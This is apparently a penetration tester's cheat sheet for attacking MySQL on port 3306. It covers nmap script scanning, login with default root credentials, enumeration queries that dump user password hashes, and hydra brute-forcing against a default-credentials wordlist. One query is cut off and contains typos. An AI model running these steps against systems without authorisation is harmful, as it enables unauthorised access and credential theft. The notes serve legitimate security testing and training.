# MySQL

## PORT 3306 MySQL

#### 1) Find credential with other port and use default to login

    nmap -sV -Pn -vv -script=mysql* $ip -p 3306

    mysql -u root -p 'root' -h 192.168.10.10 -P 3306

     mysql -u root -p 'root' -h 192.168.10.10 --skip_ssl (Use this to force authentication without SSL errors)

    select version(); | show databases; | use databse | select * from users; | show tables | select system_user(); | SELECT user, authentication_string FROM mysql.user WHERE user = Pre

#### 2) Brute force default MySQL credentials

    hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt IP mysql
